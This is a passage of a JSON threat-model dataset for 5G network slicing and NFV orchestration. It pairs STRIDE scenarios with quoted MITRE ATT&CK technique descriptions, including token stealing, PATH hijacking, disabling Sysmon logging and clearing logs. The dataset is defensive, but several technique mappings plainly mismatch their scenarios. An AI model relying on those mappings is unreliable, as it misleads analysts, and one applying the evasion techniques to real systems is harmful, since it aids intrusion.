                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit a vulnerability in NFVO to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "NFVO software contains unpatched vulnerabilities.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of timely patch management and security updates."
                },
                {
                    "Assumption": "The attacker has insider knowledge or detailed information on the NFVO.",
                    "Role": "Attacker",
                    "Condition": "Access to insider information or technical documentation."
                },
                {
                    "Assumption": "There are no effective measures to detect privilege escalation attempts.",
                    "Role": "Network Security Team",
                    "Condition": "Absent or insufficient monitoring for privilege escalation activities."
                }
            ],
            "Potential Impact": "Unauthorized access to critical functions and data, leading to system compromise and potential manipulation of network slices.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "network functions virtualization orchestrator",
                "vulnerabilities",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting improper access controls to gain administrative privileges in the system.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are incorrectly configured or outdated.",
                    "Role": "Network Administrator",
                    "Condition": "Improperly configured access control mechanisms or policies."
                },
                {
                    "Assumption": "The attacker has sufficient knowledge of the access control system.",
                    "Role": "Attacker",
                    "Condition": "Understanding of access control mechanisms and existing gaps."
                },
                {
                    "Assumption": "There is insufficient monitoring of administrative activities and privileges.",
                    "Role": "Network Security Team",
                    "Condition": "Lack of real-time monitoring and alerts for administrative actions."
                }
            ],
            "Potential Impact": "Gain of administrative privileges leading to total system compromise and unauthorized access to sensitive data and network management.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access controls",
                "administrative privileges",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Access Token Manipulation",
                "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
                "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
                "technique_id": "T1134"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Using social engineering to trick a legitimate administrator into providing higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Administrators are not adequately trained in recognizing social engineering attacks.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of robust training and awareness programs."
                },
                {
                    "Assumption": "The attacker can successfully impersonate a trusted entity.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of organizational structures and personnel."
                },
                {
                    "Assumption": "There are no secondary verification mechanisms for high-privilege activities.",
                    "Role": "Network Administrator",
                    "Condition": "Absence of multi-factor authentication or verification for privilege elevation."
                }
            ],
            "Potential Impact": "Unauthorized elevation of privileges leading to control over critical system components and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "administrative privileges",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Spearphishing Voice",
                "description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nAdversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",
                "id": "attack-pattern--6a5d222a-a7e0-4656-b110-782c33098289",
                "technique_id": "T1598.004"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "7",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a spoofed IP address to gain unauthorized access to a network slice.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can disguise their IP address.",
                    "Role": "Attacker",
                    "Condition": "The attacker has the necessary tools and knowledge to spoof IP addresses."
                },
                {
                    "Assumption": "The network slice lacks sufficient authentication checks.",
                    "Role": "Network Administrator",
                    "Condition": "The current authentication mechanisms are weak or absent."
                },
                {
                    "Assumption": "There is no robust monitoring of incoming connections.",
                    "Role": "Security Operations Team",
                    "Condition": "Network traffic monitoring is not comprehensive or real-time."
                }
            ],
            "Potential Impact": "Unauthorized access leading to potential data breach.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "unauthorized access",
                "IP address"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor masquerades as a trusted network function to intercept and manipulate data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can imitate the behavior of a trusted network function.",
                    "Role": "Attacker",
                    "Condition": "The attacker has detailed knowledge of the network function\u2019s operation."
                },
                {
                    "Assumption": "Security protocols between network functions are not stringent.",
                    "Role": "Network Security Engineer",
                    "Condition": "Security mechanisms between network functions are not adequately implemented."
                },
                {
                    "Assumption": "There is minimal verification of network function identities.",
                    "Role": "System Architect",
                    "Condition": "Identity verification protocols are not comprehensive."
                }
            ],
            "Potential Impact": "Data interception and manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network function",
                "data manipulation",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Compromise of the NFVO by spoofing an operator's credentials.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has stolen or guessed the operator\u2019s credentials.",
                    "Role": "Attacker",
                    "Condition": "Weak or reused passwords are being used."
                },
                {
                    "Assumption": "Two-factor authentication is not enforced.",
                    "Role": "System Admin",
                    "Condition": "Two-factor authentication is not mandated for operator access."
                },
                {
                    "Assumption": "NFVO access logs are not regularly reviewed.",
                    "Role": "Security Operations Team",
                    "Condition": "Lack of periodic review of access logs."
                }
            ],
            "Potential Impact": "Full control over network slice orchestration.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credentials",
                "NFVO",
                "orchestration"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the configuration of VNFs to disrupt service.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the management interface of VNFs.",
                    "Role": "Attacker",
                    "Condition": "Management interfaces are accessible over the internet."
                },
                {
                    "Assumption": "Lack of proper configuration management.",
                    "Role": "Network Administrator",
                    "Condition": "Configuration changes are not logged or monitored."
                },
                {
                    "Assumption": "Insufficient access controls on VNF management.",
                    "Role": "Security Architect",
                    "Condition": "Access control policies are not strictly enforced."
                }
            ],
            "Potential Impact": "Service disruption and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "VNF",
                "configuration",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Internal threat actor alters network slice isolation parameters.",
            "Assumptions": [
                {
                    "Assumption": "The internal actor has elevated access permissions.",
                    "Role": "Malicious Insider",
                    "Condition": "Potential misuse of authorized access by internal staff."
                },
                {
                    "Assumption": "Changes to isolation parameters are not audited.",
                    "Role": "Compliance Officer",
                    "Condition": "Audit trails are not maintained or regularly reviewed."
                },
                {
                    "Assumption": "There is no Separation of Duties (SoD) enforcement.",
                    "Role": "Human Resources",
                    "Condition": "Critical changes can be made without secondary approval."
                }
            ],
            "Potential Impact": "Cross-slice contamination and data leakage.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "isolation parameters",
                "internal threat",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware infection alters the orchestration flow of the NFVO.",
            "Assumptions": [
                {
                    "Assumption": "The NFVO is running vulnerable software.",
                    "Role": "IT Administrator",
                    "Condition": "Outdated or unpatched software versions."
                },
                {
                    "Assumption": "Endpoint protection is not in place or is ineffective.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of adequate endpoint security measures."
                },
                {
                    "Assumption": "Network traffic to NFVO is not monitored for anomalies.",
                    "Role": "Security Operations Team",
                    "Condition": "Lack of sophisticated network traffic analysis tools."
                }
            ],
            "Potential Impact": "Unauthorized configuration changes and potential service sabotage.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "NFVO",
                "orchestration flow",
                "malware"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--03e549e9-6abd-4ed2-973a-fbc78d61d4b6",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies performing unauthorized VNF changes.",
            "Assumptions": [
                {
                    "Assumption": "There are no non-repudiation controls in place.",
                    "Role": "Security Architect",
                    "Condition": "Lack of mechanisms to verify the actioner's identity."
                },
                {
                    "Assumption": "Log files may be tampered with or are incomplete.",
                    "Role": "Security Operations Team",
                    "Condition": "Log integrity is not protected."
                },
                {
                    "Assumption": "Access changes are not recorded.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of detailed access logs for VNF management."
                }
            ],
            "Potential Impact": "Difficulty in attributing actions leading to security breaches.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "VNF changes",
                "non-repudiation",
                "log tampering"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user falsely denies sending a harmful command to a network function.",
            "Assumptions": [
                {
                    "Assumption": "Command execution logs are incomplete or missing.",
                    "Role": "System Admin",
                    "Condition": "Logging mechanisms are not robust or comprehensive."
                },
                {
                    "Assumption": "The system lacks comprehensive audit trails.",
                    "Role": "Compliance Officer",
                    "Condition": "Audit trail policies are not implemented."
                },
                {
                    "Assumption": "Insufficient forensic capabilities.",
                    "Role": "Incident Response Team",
                    "Condition": "Lack of tools for detailed forensic analysis."
                }
            ],
            "Potential Impact": "Hindered investigation and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "network function",
                "command",
                "audit trails"
            ],
            "mitre_technique": {
                "name": "Path Interception by PATH Environment Variable",
                "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",
                "id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
                "technique_id": "T1574.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A rogue operator denies modifying orchestration policies.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration policy changes are not logged.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of detailed logging for policy changes."
                },
                {
                    "Assumption": "The system does not enforce multi-factor authentication.",
                    "Role": "Security Architect",
                    "Condition": "Weak authentication mechanisms."
                },
                {
                    "Assumption": "Logs can be modified by unauthorized persons.",
                    "Role": "IT Administrator",
                    "Condition": "Inadequate log access controls."
                }
            ],
            "Potential Impact": "Untraceable changes leading to potential service degradation or disruption.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "orchestration policies",
                "log integrity",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data accidentally exposed through misconfigured external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are not properly secured.",
                    "Role": "Network Security Engineer",
                    "Condition": "Misconfiguration due to oversight or lack of secure configuration guidelines."
                },
                {
                    "Assumption": "Sensitive data is transferred over insecure channels.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption for data in transit."
                },
                {
                    "Assumption": "Regular security audits are not conducted.",
                    "Role": "Compliance Officer",
                    "Condition": "Absence of periodic security assessments."
                }
            ],
            "Potential Impact": "Unauthorized data exposure and potential breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "external interfaces",
                "misconfiguration",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Interception of network traffic between network functions.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "Network Security Engineer",
                    "Condition": "Data transmission lacks encryption protocols."
                },
                {
                    "Assumption": "Access to network traffic is not restricted.",
                    "Role": "IT Administrator",
                    "Condition": "Open access to network infrastructure."
                },
                {
                    "Assumption": "Anomaly detection systems are not in place.",
                    "Role": "Security Operations Team",
                    "Condition": "Lack of traffic monitoring tools."
                }
            ],
            "Potential Impact": "Captured data could lead to breaches of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network traffic",
                "interception",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
